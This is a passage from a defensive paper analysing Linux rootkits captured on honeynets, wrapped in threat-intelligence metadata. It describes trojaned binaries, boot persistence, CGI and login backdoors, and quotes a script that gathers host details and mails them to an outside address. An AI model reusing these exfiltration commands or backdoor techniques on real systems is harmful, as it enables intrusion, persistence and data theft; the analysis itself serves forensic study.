This kit\nmakes its home in the directory /dev/ida/.inet (again, one more of those\nsupposedly innocuous locations, where amateur administrators never look). The\nscript copies most of the above files into a new home and then creates an empty\nsniffer log (in the location /dev/ida/.inet/tcp.log)\n\n6. As a next step, the kit uses a curious method to start its own components in the\nform of a secure shell (SSH) daemon and sniffer on system boot. It creates a fake\ncopy of the rarely used system application hdparm, which is used to tune the hard\ndrive performance. The fake copy is actually a shell script that launches the\nsniffer and the backdoor ssh daemon. Complete with fake but realistic parameters,\nsuch as /usr/bin/hdparm -t1 -X53 -p, the string is copied into the system startup\nfile /etc/rc.d/rc.sysinit to run on every boot. For good measure, the hdparm file is\nmade readable only by root and immutable, via Linux capabilities mechanism\nchattr +I, so that even root cannot erase it, unless the attribute is set back to -i.\n\n**Page 17 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\n7. The kit deploys a backup backdoor, an evil CGI script named becys.cgi. The\ninstallation script searches for a system default CGI directory, located at\n/home/httpd/cgi-bin, /usr/local/apache/cgi-bin or elsewhere, and copies the script\nbecys.cgi to that location. The CGI backdoor provides shell access over the web\nas the user apache. The attacker could easily execute commands like cat\n/etc/password via such a backdoor. The CGI is a binary application written in C\nand not the usual Perl CGI.\n\n8. As a next-to-last step, the script composes an e-mail to its owner, apparently for\nkeeping score on the hacked systems. The e-mail contains the system's IP address,\nhostname and uname system information. The command uname -a typically\nreturns something like \"Linux anton 2.4.18-14 #1 Wed Sep 4 13:35:50 EDT 2002\ni686 i686 i386 GNU/Linux.\" The e-mail proclaims in Romanian, \"Another victim\nof hackers!\"\n\n9. The kit then erases the directory where it was unpacked and the tar archive\npackage.\n\nAn analysis of binary files within the kit shows that the binaries are hardcoded to use\nhidden files. For example, the string /dev/dsx is present in the Trojan version of the\n/bin/ps. This confirms that the Trojan refers to this file to look up the process names to\nhide. One of the captured files is a sniffer, complete with log parser. A simple plaintext\nlog cleaner is also included (logclear in the above file list) as well an old DoS tool (slice,\nnamed sl2).\n\nOverall, the kit is a primitive first-generation binary-only kit with no log cleaning tools\nand no advanced features. All included technology is publicly available from various\nsecurity or hacking websites.\n\n#### W00tkit: One of the Many Children of t0rn\n\nW00tkit was captured on a Linux honeynet in summer 2002. A fully automated\nautorooter tool, which deployed the kit after the exploit succeeded, performed the attack.\nThe tool owner accessed the victim within several days from the compromise.\n\nThe kit appears to be one of the many derivatives from the t0rn v.8 kit, due to the use of\nhiding the library libproc.so.2.0.6. However, in this case, the malicious LKM Adore also\nsupports the library.\n\nThe components of the kit are listed below:\n\n- chattr - du - init\n\n- check - encrypt - initd\n\n- cl - exit - install\n\n- clean - exit2 - install1\n\n- curatare - fix - killall\n\n- dir - ifconfig\n\n**Page 18 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\n- startfile\n\n- statdx\n\n- top\n\n- v\n\n- vdir\n\n- write\n\n- wroot\n\n- wscan\n\n- wted\n\n- wu\n\n\n\n- lg\n\n- libproc.so.2.0.6\n\n- login\n\n- ls\n\n- lsof\n\n- mailme\n\n- mailme1\n\n- md5sum\n\n- move\n\n- netstat\n\n- patch\n\n\n\n- ps\n\n- pstree\n\n- read\n\n- remove\n\n- sc\n\n- scan/\n\n- sl2\n\n- ssh_host_key\n\n- ssh_host_key.pub\n\n- ssh_random_seed\n\n- sshd_config\n\n\nThe installation process of the kit actually performs the following steps:\n\n1. The first step is predictable. The script disables the shell history (unset HISTFILE;\nunset HISTSAVE).\n\n2. Next, the install script launches another script called remove from the same package.\nThe script first collects the MD5 checksums of the original system binaries to be trojaned\nand encrypts the resulting file with the rootkit default password, also erasing the plaintext\nfile immediately after the encryption.\n\n3. Next the script places the Trojans of the above system binaries, and a library, and\nmakes them non-removable (using chattr +saui). The applications chattr, md5sum,\nnetstat, ps, top, ifconfig, pstree, dir, vdir, killall, du and ls are replaced by trojaned\nversions. This kit is much more thorough than the previous one in trojaning the system.\n\n4. As a next step, the script performs some simple system hardening, namely by stopping\nand then removing the service portmap, a common subject of old Linux exploits.\n\n5. The rootkit looks for two configuration files, used by other rootkits (in fact, used by\nthe rootkit described above) and eliminates them with the command rm -f /dev/caca.\nSeveral files are thus removed:\n\n/dev/caca\n/dev/pisu\n/dev/dsx\n\n6. Next, the rootkit deploys its own configuration files to control the hiding modules as\nthe files /usr/include/proc.h, /usr/include/file.h and /usr/include/hosts.h. The real content\nof those C-language header files becomes something like:\n\n1 xlogic.ca\n1 limp-bizkit.ro\n2 193.231\n2 217.156\n2 217.10\n\n**Page 19 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\n2 213.233\n2 microrom.ro\n3 25330\n3 1981\n4 25330\n4 6667\n4 6666\n2 awu\n2 7350wurm\n2 startwu\n2 screen\n2 SCREEN\n2 psy\n3 xl\n2 xbnc\n2 initd\n2 scan\n\nAfter deployment, the kit makes the files immutable. The interesting consequence of such\nconfiguration files is that those strings are more innocuous when found within the binary\nfiles (for example, /dev/dsx, which looks suspicious within the /bin/ls binary)\n\n7. Next, the script deploys the main backdoor (as usual, the modified SSH daemon) as\n/sbin/initd. Before deployment, it checks for the presence of such a file and removes it.\n\n8. This completes the first subscript. Control is returned to the main script only to be\ngiven to another component: move. This subscript looks for and cleans up other common\nrootkit locations, such as /usr/bin/etc, /usr/man/man1/, /.dir/, /dev/, /bin/vobiscum,\n/usr/sbin/sshd3, /lib/.so, /lib/.sso /usr/include/, /dev/kdx, and many others. In addition, it\ntries to sweep for other running Trojans and execute a kill command on them. Here is an\nexample:\n\nkill -9 `/sbin/pidof /usr/bin/ras2xm`\nkill -9 `/sbin/pidof snif`\n\nThe script also searches some of the configuration files for some known other rootkits\ncomponents and attempts to clean them out as well. For example, it scans\n/etc/rc.d/rc.sysinit for the presence of /usr/bin/sourcemask, an apparently innocuous name\nsuitable for a Trojan. The kit does a nice job of eliminating the competing malware on the\ncaptured system.\n\nThe script also performs other cleanup actions, such as killing squid proxy, which is often\nabused for semi-anonymous access to web and FTP resources. In fact, the clean up is\ndone on a per-competing rootkit basis. For example, if /usr/X11R6/include/X11/... is\npresent, then the kit performs steps like the following:\n\n**Page 20 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\nkill -9 `/sbin/pidof /usr/sbin/sshd2\nrm -rf /usr/sbin/sshd2\nrm -rf /usr/sbin/userdel system\n\nFor other cases, the kit kills other daemons and removes other files.\n\n9. The final step of the move script is to disable anonymous FTP access:\n\necho anonymous >> /etc/ftpusers\necho ftp >> /etc/ftpusers\n\nIt then turns off history and removes the SUID root flag from certain software (mostly\nRPC-related). This makes the system harder to exploit from the network.\n\n10. The script then returns to the main script and deploys a login backdoor, activated by\nthe magic TERM variable value. Telnet and SSH clients often set the value when\nconnecting to a system. If the TERM is set to a predefined value known to a hacker, the\napplication /bin/login does not perform any authentication.\n\n11. After this, the script creates its own home directory at /usr/bin/.zeen/\".. \"/ and deploys\nits components in it. Those include log-cleaning and hiding tools, several attack scanners,\nmany scripts for specific attacks (mostly more than one year old), and a nice set of DoS\ntools. Note that the scripts contain comments in at least three different languages.\n\n12. Then the script unpacks, compiles and deploys the Adore LKM, which is used as an\nadditional layer for hiding the components. The Adore LKM is renamed and inserted into\na kernel where it self-hides.\n\n13. Another subcomponent then launches and modifies the system configuration files to\nexecute various components on system start-up, from inittab, etc. The penetration is\nrather complete within the whole /etc directory tree. Again, offense-in-depth is practiced;\nseveral components do the job for every desired function.\n\n14. The script then composes e-mails to several e-mail addresses with the following\ninformation: victim's IP address, hostname, machine type, logged in users (via w\ncommand), ping to Yahoo! time (a good estimate of a quality of a network connection),\nmemory and CPU information. It even adds the port number where the backdoor SSH\nruns. Here is the appropriate excerpt to compose the e-mail.\n\n/sbin/ifconfig -a | grep inet >> /tmp/info\nhostname -f >> /tmp/info\nuname -a >> /tmp/info\nw >> /tmp/info\ncat /proc/meminfo >> /tmp/info\nping -c 6 yahoo.com >> /tmp/info\n/sbin/route -n >> /tmp/info\n\n**Page 21 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\necho \"port 2006\" >> /tmp/info\ncat /tmp/info | mail -s \"[MyBitch2006]\" roi_blabla@walla.co.il\nrm -f /tmp/info\n\nIt does a thorough job of status reporting.\n\n15. Near the end of the installation, the script cleans the logs from the predefined list of\nkey words, such as yahoo.com, ssh, initd (renamed SSHD), and a long series of IP\naddress classes favored by this particular hacker.\n\n16. Finally, the script patches the machine's standard SSHD daemon for a hole by\nreplacing it with the supplied SSHD version (same as used above for the backdoor\naccess). It remains to be seen whether another backdoor in the ssh code backs up the\nhigh-port SSHD and /bin/login backdoor.\n\nOverall, the rootkit presents a wild mix of technologies, applications and even cultures. It does a\nrelatively thorough job of penetrating the system to the point that a full rebuilt is the most\neffective recovery option. Many more of the components are included but not discussed here;\nmany of them are not even used by default.\n\n#### Rk: Hidden but Not Enough\n\nThe rk kit was captured on a Linux honeynet in late 2002.\n\nThe kit appears to be a custom mix of components. Here is a list of its distinctive features, as the\nlogic of the installation script and the composition of the kit is similar to the previous one.\n\ntotal 69\n-rw-r--r-- 1 anton None 68286 Mar 19 2002 install\n-rw-r--r-- 1 anton None 1848 Mar 15 2002 rk_config\ndrwxr-xr-x 2 anton None 0 Dec 16 19:07 smbfs\ndrwxr-xr-x 2 anton None 0 Dec 16 19:07 ssh\ndrwxr-xr-x 7 anton None 0 Dec 16 19:07 utils\n\nThe kit includes the binary installation file install. The typical installation script was compiled\ninto a binary form. However, the command strings reveals most of the performed actions. The kit\nalso includes the Adore LKM fully translated into Romanian. The installation script also\nannounces \"This RootKit is made in Romania.\" Adore is built on a victim system. However, if\nno compiler (gcc) is available, several prebuilt modules (for RedHat 7.0-7.2) are available and\nare tried in order. If those fail, the regular binary Trojans are deployed. Its home directory\nlocation is /var/run/radvd/hd.\n\nThe kit installs an IRC bouncer muh, a tool to reroute IRC connections to hide one's true\nconnection origin. The kit includes an extensive list of competing rootkits to be eliminated on the\nsystem. It dwarfs even the coverage from the previous kit. One of the interesting hackers tools\nthat the kits searches for and eliminates is a SSH local sniffer. Among the rootkit's perks is a\nfeature that adjusts the deployment of components based on the detected Linux distribution. For\n\n**Page 22 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\nexample, some file locations are used only if the system is a Debian GNU/Linux. Many Linux\nvariants are recognized. The kit also boasts an impressive patching engine that actually goes to\nthe RedHat FTP site and downloads updates appropriate for the victim distribution. The kit also\nperforms system hardening, such as SUID-flag elimination from many files. As a last step, the\ninstallation script e-mails information about the system similar to above, including the files\n/etc/shadow and /etc/passwd.\n\nThe kit is an interesting combination of tools and seems like a well-polished intrusion solution\nfor amateur Linux attackers.\n\n**Page 23 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\n## CONCLUSION\n\n\nThis paper examined several common Linux rootkits. The reviewed kits do not use any of the\nnon-public tools. Host-based integrity-checking tools, such as the latest Tripwire, can discover\nall of the kits. The Adore LKM makes an attempt to hide from integrity-checking software, but\nTripwire uses a different system call to access the file system. Adore does not remap this system\ncall. However, the most effective way to recover after a compromise involving these kits is a full\nsystem reinstall, as some kit components may always be missed. For example, Tripwire might\nnot look at the cgi-bin directory, and thus it would miss one backdoor.\n\nMore advanced rootkits exist in the wild; however, those are not often captured on Internetexposed honeypots when no special effort is made to detect advanced attackers.\n\n**Page 24 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\n## END NOTES\n\n\n1 Trojaned = replaced by the Trojan version that provides extra functionality beneficial to\nattacker\n2 Script kiddy = entry-level amateur hacker, often using other people's tools without\nunderstanding their operation\n3 [Available at http://www.radium.ncsc.mil/tpep/library/rainbow/ and in many other places](http://www.radium.ncsc.mil/tpep/library/rainbow/)\nonline\n4 Autorooter = tool to automatically scan for vulnerable hosts and exploit them\n5 Banner grab = looking at network service login banner (FTP, telnet, etc)\n6 tar is a standard Unix archival tool.\n7 An autorooter is a hacker tool combining a scanner with exploit module. It is used for\none-step mass scanning and exploitation. Autorooters are very popular with East European script\nkiddies.\n\n**Page 25 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\n## ABOUT THE AUTHOR\n\n\n[Anton Chuvakin, Ph.D., GCIA (http://www.chuvakin.org), is a senior security analyst with a](http://www.chuvakin.org)\nmajor information security company. His areas of information security expertise include\nintrusion detection, Unix security, forensics, honeypots, etc. In his spare time, he maintains a\n[security portal at http://www.info-secure.org.](http://www.info-secure.org)\n\n**Page 26 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\n## ACKNOWLEDGEMENTS\n\n\nThanks to the following individuals for their efforts:\n\n[ï¿½ Anton Chuvakin, Author, http://www.info-secure.org](http://www.info-secure.org)\n[ï¿½ Sunil James, Manager, Vulnerability Contributor Program, iDEFENSE Inc.](http://www.idefense.com/contributor.html)\nï¿½ David Endler, Director, Technical Intelligence, iDEFENSE Inc.\nï¿½ Mickey McCarter, Editor, Newspoint Inc.\nï¿½ Catherine Beck, Editor, Newspoint Inc.\n\n**Page 27 of 27** **An Overview of Unix Rootkits**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "http://www.megasecurity.org/papers/Rootkits.pdf"
    ],
    "report_names": [
        "Rootkits.pdf"
    ],
    "threat_actors": [
        {
            "id": "ca5d1398-1ab3-4844-91e3-f2b436f802f7",
            "created_at": "2024-02-02T02:00:04.047821Z",
            "updated_at": "2025-03-27T02:00:03.299804Z",
            "deleted_at": null,
            "main_name": "Raspberry Typhoon",
            "aliases": [
                "RADIUM"
            ],
            "source_name": "MISPGALAXY:Raspberry Typhoon",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1f6ae238-765f-4495-9d54-6a7883d7a319",
            "created_at": "2022-10-25T16:07:24.573456Z",
            "updated_at": "2025-03-27T02:02:10.284644Z",
            "deleted_at": null,
            "main_name": "TA511",
            "aliases": [
                "MAN1",
                "Moskalvzapoe"
            ],
            "source_name": "ETDA:TA511",
            "tools": [
                "Agentemis",
                "Chanitor",
                "Cobalt Strike",
                "CobaltStrike",
                "Ficker Stealer",
                "Hancitor",
                "NetSupport",
                "NetSupport Manager",
                "NetSupport Manager RAT",
                "NetSupport RAT",
                "NetSupportManager RAT",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "2fa14cf4-969f-48bc-b68e-a8e7eedc6e98",
            "created_at": "2022-10-25T15:50:23.538608Z",
            "updated_at": "2025-03-27T02:00:55.495551Z",
            "deleted_at": null,
            "main_name": "Lotus Blossom",
            "aliases": [
                "Lotus Blossom",
                "DRAGONFISH",
                "Spring Dragon",
                "RADIUM",
                "Raspberry Typhoon"
            ],
            "source_name": "MITRE:Lotus Blossom",
            "tools": [
                "Elise"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "542cf9d0-9c68-428c-aff8-81b6f59dc985",
            "created_at": "2023-02-15T02:01:49.554105Z",
            "updated_at": "2025-03-27T02:00:03.110991Z",
            "deleted_at": null,
            "main_name": "Moskalvzapoe",
            "aliases": [
                "MAN1",
                "TA511"
            ],
            "source_name": "MISPGALAXY:Moskalvzapoe",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "360f51f5-8a80-41d6-92c4-9aa042cd2732",
            "created_at": "2022-10-25T16:07:23.34569Z",
            "updated_at": "2025-03-27T02:02:09.746944Z",
            "deleted_at": null,
            "main_name": "APT 30",
            "aliases": [
                "APT 30",
                "Bronze Geneva",
                "Bronze Sterling",
                "CTG-5326",
                "Override Panda",
                "RADIUM",
                "Raspberry Typhoon"
            ],
            "source_name": "ETDA:APT 30",
            "tools": [
                "BackBend",
                "Creamsicle",
                "Flashflood",
                "Gemcutter",
                "Lecna",
                "NetEagle",
                "Neteagle_Scout",
                "Orangeade",
                "ScoutEagle",
                "Shipshape",
                "ZRLnk",
                "norton"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1724551421,
    "ts_updated_at": 1743041803,
    "ts_creation_date": 1046189906,
    "ts_modification_date": 1046190147,
    "files": {
        "pdf": "https://archive.orkl.eu/ab94b628493b6e25709ad7a5b4ea780741424be3.pdf",
        "text": "https://archive.orkl.eu/ab94b628493b6e25709ad7a5b4ea780741424be3.txt",
        "img": "https://archive.orkl.eu/ab94b628493b6e25709ad7a5b4ea780741424be3.jpg"
    }
}